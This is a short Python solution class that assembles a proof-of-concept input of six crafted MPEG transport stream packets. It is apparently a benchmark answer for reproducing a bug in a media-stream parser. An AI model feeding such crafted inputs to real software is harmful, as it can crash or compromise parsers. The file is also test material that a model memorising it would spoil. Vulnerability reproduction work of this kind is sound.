class Solution:
    def solve(self, src_path: str) -> bytes:
        packet1_header = b'\x47\x40\x00\x20'
        packet1_payload = (
            b'\x00\x00\xF0\x0D\x00\x01\xC1\x00\x00\x00\x01\xF1\x00\x00\x00\x00\x00' +
            b'\x00' * 167
        )
        packet1 = packet1_header + packet1_payload

        packet2_header = b'\x47\x00\x64\x10'
        packet2 = packet2_header + b'\x00' * 184

        packet3_header = b'\x47\x00\x64\x11'
        packet3 = packet3_header + b'\x00' * 184

        packet4_header = b'\x47\x00\x65\x10'
        packet4 = packet4_header + b'\x00' * 184

        packet5_header = b'\x47\x00\x65\x11'
        packet5 = packet5_header + b'\x00' * 184

        packet6_header = b'\x47\x00\x65\x12'
        packet6 = packet6_header + b'\x00' * 184

        poc = packet1 + packet2 + packet3 + packet4 + packet5 + packet6
        return poc
